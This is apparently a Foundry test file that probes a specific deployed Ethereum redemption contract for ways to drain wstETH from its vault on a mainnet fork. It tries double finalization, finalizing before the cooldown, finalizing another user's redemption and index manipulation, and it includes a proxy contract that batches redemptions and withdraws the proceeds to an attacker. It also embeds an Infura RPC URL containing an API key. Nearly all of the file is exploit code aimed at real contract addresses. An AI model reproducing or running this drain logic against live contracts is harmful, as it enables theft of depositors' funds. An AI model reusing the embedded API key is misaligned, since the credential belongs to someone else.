// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}

/**
 * DOUBLE FINALIZE EXPLOIT INVESTIGATION
 * Testing if we can drain via multiple finalizations
 */
contract DoubleFinalizeExploit is Test {
    address constant R0 = 0xcd63a29FAfF07130d3Af89bB4f40778938AaBB85;
    address constant RC = 0xdF2eE409BEe416A53b5C040d8e6dAD4a7cEb2510;
    address constant VAULT = 0x551d155760ae96050439AD24Ae98A96c765d761B;
    address constant wstETH = 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0;
    address constant TASSET = 0xD11c452fc99cF405034ee446803b6F6c1F6d5ED8;

    string RPC_URL = "https://mainnet.infura.io/v3/bfc7283659224dd6b5124ebbc2b14e2c";
    address attacker;

    function setUp() public {
        vm.createSelectFork(RPC_URL);
        attacker = makeAddr("attacker");
        vm.deal(attacker, 100 ether);
    }

    function test_DoubleFinalizeExploit() public {
        console.log("=== DOUBLE FINALIZE EXPLOIT ===\n");

        uint256 vaultInitial = IERC20(wstETH).balanceOf(VAULT);
        console.log("Vault initial:", vaultInitial / 1e18, "wstETH");

        deal(TASSET, attacker, 10000e18);

        vm.startPrank(attacker);
        IERC20(TASSET).approve(R0, type(uint256).max);

        // Create ONE redemption
        R0.call(abi.encodeWithSignature("redeem(uint96)", uint96(1000e18)));
        console.log("Created 1 redemption of 1000 TASSET");

        vm.stopPrank();

        // Wait for cooldown
        vm.warp(block.timestamp + 7 days + 1);
        console.log("Waited 7 days");

        vm.startPrank(attacker);

        // Try to finalize MULTIPLE times
        console.log("\nAttempting multiple finalizations:");

        uint256 totalReceived = 0;

        for (uint i = 0; i < 5; i++) {
            uint256 balBefore = IERC20(wstETH).balanceOf(attacker);

            (bool success,) = R0.call(
                abi.encodeWithSignature("finalizeRedeem(uint256)", 0)
            );

            uint256 balAfter = IERC20(wstETH).balanceOf(attacker);
            uint256 received = balAfter - balBefore;
            totalReceived += received;

            console.log("Finalize %d success: %s received: %d", i, success, received / 1e18);

            if (!success || received == 0) {
                console.log("  Stopped - no more funds");
                break;
            }
        }

        vm.stopPrank();

        uint256 vaultFinal = IERC20(wstETH).balanceOf(VAULT);
        uint256 attackerFinal = IERC20(wstETH).balanceOf(attacker);

        console.log("\n=== RESULTS ===");
        console.log("Total received:", totalReceived / 1e18, "wstETH");
        console.log("Attacker final:", attackerFinal / 1e18, "wstETH");
        console.log("Vault drained:", (vaultInitial - vaultFinal) / 1e18, "wstETH");
        console.log("Vault remaining:", vaultFinal / 1e18, "wstETH");

        if (attackerFinal > 1000e18) {
            console.log("\n*** DOUBLE FINALIZE WORKS - GOT MORE THAN DEPOSITED! ***");
        }
    }

    function test_MultipleRedemptionsOneFinalize() public {
        console.log("=== MULTIPLE REDEMPTIONS ONE FINALIZE ===\n");

        uint256 vaultInitial = IERC20(wstETH).balanceOf(VAULT);
        console.log("Vault initial:", vaultInitial / 1e18);

        deal(TASSET, attacker, 10000e18);

        vm.startPrank(attacker);
        IERC20(TASSET).approve(R0, type(uint256).max);

        // Create MULTIPLE redemptions
        console.log("Creating multiple redemptions...");
        for (uint i = 0; i < 5; i++) {
            (bool s,) = R0.call(
                abi.encodeWithSignature("redeem(uint96)", uint96(1000e18))
            );
            console.log("Redemption %d: %s", i, s);
        }

        // Check redemption count
        (bool cs, bytes memory cd) = R0.staticcall(
            abi.encodeWithSignature("getRedeemLength(address)", attacker)
        );
        if (cs) {
            console.log("Redemption count:", abi.decode(cd, (uint256)));
        }

        vm.stopPrank();

        vm.warp(block.timestamp + 7 days + 1);

        vm.startPrank(attacker);

        // Finalize all
        console.log("\nFinalizing all:");
        for (uint i = 0; i < 6; i++) {
            uint256 balBefore = IERC20(wstETH).balanceOf(attacker);

            (bool fs,) = R0.call(
                abi.encodeWithSignature("finalizeRedeem(uint256)", i)
            );

            uint256 balAfter = IERC20(wstETH).balanceOf(attacker);

            if (fs && balAfter > balBefore) {
                console.log("Index %d - received: %d", i, (balAfter - balBefore) / 1e18);
            } else {
                console.log("Index %d - failed or no funds", i);
            }
        }

        vm.stopPrank();

        uint256 attackerFinal = IERC20(wstETH).balanceOf(attacker);
        uint256 vaultFinal = IERC20(wstETH).balanceOf(VAULT);

        console.log("\nAttacker final:", attackerFinal / 1e18);
        console.log("Vault remaining:", vaultFinal / 1e18);
    }

    function test_ImmediateMultipleFinalize() public {
        console.log("=== IMMEDIATE MULTIPLE FINALIZE (NO WAIT) ===\n");

        uint256 vaultInitial = IERC20(wstETH).balanceOf(VAULT);

        deal(TASSET, attacker, 10000e18);

        vm.startPrank(attacker);
        IERC20(TASSET).approve(R0, type(uint256).max);

        // Create redemption
        R0.call(abi.encodeWithSignature("redeem(uint96)", uint96(1000e18)));

        // Try to finalize IMMEDIATELY (no wait)
        console.log("Trying immediate finalize (no waiting):");

        for (uint i = 0; i < 3; i++) {
            uint256 balBefore = IERC20(wstETH).balanceOf(attacker);

            (bool success,) = R0.call(
                abi.encodeWithSignature("finalizeRedeem(uint256)", i)
            );

            uint256 balAfter = IERC20(wstETH).balanceOf(attacker);

            console.log("Index %d: %s received: %d", i, success, (balAfter - balBefore) / 1e18);

            if (balAfter > balBefore) {
                console.log("*** IMMEDIATE DRAIN! ***");
            }
        }

        vm.stopPrank();

        uint256 attackerFinal = IERC20(wstETH).balanceOf(attacker);
        console.log("\nAttacker final:", attackerFinal / 1e18);

        if (attackerFinal > 0) {
            console.log("*** IMMEDIATE EXPLOIT SUCCESS ***");
        }
    }

    function test_ProxyDoubleFinalizeExploit() public {
        console.log("=== PROXY DOUBLE FINALIZE EXPLOIT ===\n");

        uint256 vaultInitial = IERC20(wstETH).balanceOf(VAULT);
        console.log("Vault initial:", vaultInitial / 1e18);

        // Deploy proxy
        vm.startPrank(attacker);
        DoubleFinalizerProxy proxy = new DoubleFinalizerProxy();
        vm.stopPrank();

        deal(TASSET, address(proxy), 10000e18);

        // Execute via proxy
        proxy.initiateRedemptions(5);

        vm.warp(block.timestamp + 7 days + 1);

        uint256 vaultBefore = IERC20(wstETH).balanceOf(VAULT);

        proxy.finalizeAll(10);

        proxy.withdraw(attacker);

        uint256 attackerFinal = IERC20(wstETH).balanceOf(attacker);
        uint256 vaultFinal = IERC20(wstETH).balanceOf(VAULT);

        console.log("\nAttacker final:", attackerFinal / 1e18);
        console.log("Vault drained:", (vaultBefore - vaultFinal) / 1e18);

        // Calculate ratio
        if (attackerFinal > 0) {
            console.log("Ratio received/deposited:", attackerFinal * 100 / (5000e18), "%");
        }
    }

    function test_RaceConditionExploit() public {
        console.log("=== RACE CONDITION EXPLOIT ===\n");

        // What if we finalize from multiple addresses at same time?

        address attacker2 = makeAddr("attacker2");

        deal(TASSET, attacker, 5000e18);
        deal(TASSET, attacker2, 5000e18);

        // Both create redemptions
        vm.startPrank(attacker);
        IERC20(TASSET).approve(R0, type(uint256).max);
        R0.call(abi.encodeWithSignature("redeem(uint96)", uint96(1000e18)));
        vm.stopPrank();

        vm.startPrank(attacker2);
        IERC20(TASSET).approve(R0, type(uint256).max);
        R0.call(abi.encodeWithSignature("redeem(uint96)", uint96(1000e18)));
        vm.stopPrank();

        vm.warp(block.timestamp + 7 days + 1);

        // Can attacker2 finalize attacker's redemption?
        console.log("Attacker2 trying to finalize attacker's redemption:");

        vm.startPrank(attacker2);
        (bool s1,) = R0.call(abi.encodeWithSignature("finalizeRedeem(uint256)", 0));
        console.log("Success:", s1);
        vm.stopPrank();

        console.log("Attacker wstETH:", IERC20(wstETH).balanceOf(attacker) / 1e18);
        console.log("Attacker2 wstETH:", IERC20(wstETH).balanceOf(attacker2) / 1e18);

        // Now attacker finalizes
        vm.startPrank(attacker);
        R0.call(abi.encodeWithSignature("finalizeRedeem(uint256)", 0));
        vm.stopPrank();

        console.log("\nAfter attacker finalizes:");
        console.log("Attacker wstETH:", IERC20(wstETH).balanceOf(attacker) / 1e18);
    }

    function test_IndexManipulationExploit() public {
        console.log("=== INDEX MANIPULATION EXPLOIT ===\n");

        deal(TASSET, attacker, 10000e18);

        vm.startPrank(attacker);
        IERC20(TASSET).approve(R0, type(uint256).max);

        // Create multiple redemptions
        for (uint i = 0; i < 3; i++) {
            R0.call(abi.encodeWithSignature("redeem(uint96)", uint96(1000e18)));
        }

        vm.stopPrank();

        vm.warp(block.timestamp + 7 days + 1);

        vm.startPrank(attacker);

        // Try various index patterns
        console.log("Trying various index patterns:");

        // Reverse order
        console.log("\nReverse order (2,1,0):");
        for (uint i = 3; i > 0; i--) {
            (bool s,) = R0.call(abi.encodeWithSignature("finalizeRedeem(uint256)", i - 1));
            console.log("Index %d: %s", i - 1, s);
        }

        // Same index multiple times
        console.log("\nSame index (0) multiple times:");
        for (uint i = 0; i < 3; i++) {
            (bool s,) = R0.call(abi.encodeWithSignature("finalizeRedeem(uint256)", 0));
            uint256 bal = IERC20(wstETH).balanceOf(attacker);
            console.log("Try %d: %s bal: %d", i, s, bal / 1e18);
        }

        vm.stopPrank();

        console.log("\nFinal attacker wstETH:", IERC20(wstETH).balanceOf(attacker) / 1e18);
    }
}

contract DoubleFinalizerProxy {
    address constant R0 = 0xcd63a29FAfF07130d3Af89bB4f40778938AaBB85;
    address constant TASSET = 0xD11c452fc99cF405034ee446803b6F6c1F6d5ED8;
    address constant wstETH = 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0;

    function initiateRedemptions(uint256 count) external {
        IERC20(TASSET).approve(R0, type(uint256).max);
        for (uint i = 0; i < count; i++) {
            R0.call(abi.encodeWithSignature("redeem(uint96)", uint96(1000e18)));
        }
    }

    function finalizeAll(uint256 maxTries) external {
        for (uint i = 0; i < maxTries; i++) {
            (bool success,) = R0.call(
                abi.encodeWithSignature("finalizeRedeem(uint256)", i)
            );
            if (!success) break;
        }
    }

    function withdraw(address to) external {
        uint256 bal = IERC20(wstETH).balanceOf(address(this));
        if (bal > 0) {
            IERC20(wstETH).transfer(to, bal);
        }
    }
}
